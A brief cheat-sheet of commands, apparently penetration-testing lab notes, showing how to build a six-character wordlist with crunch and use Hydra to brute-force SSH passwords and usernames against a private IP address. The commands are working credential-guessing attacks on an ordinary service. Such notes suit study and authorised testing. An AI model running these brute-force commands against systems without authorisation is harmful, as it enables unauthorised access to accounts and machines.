#Create Password Lists
crunch 6 6 -t Lab%%% > wordlist    #Create custom password list using crunch. Min/max length set to 6 and first 3 letter of password are Lab

#Hydra
hydra -l username -P wordlist  192.168.50.214 -t 4 ssh -V    #Brute force ssh password
hydra -L usernamelist -p password  192.168.50.214 -t 4 ssh    #Brute force ssh username with known password





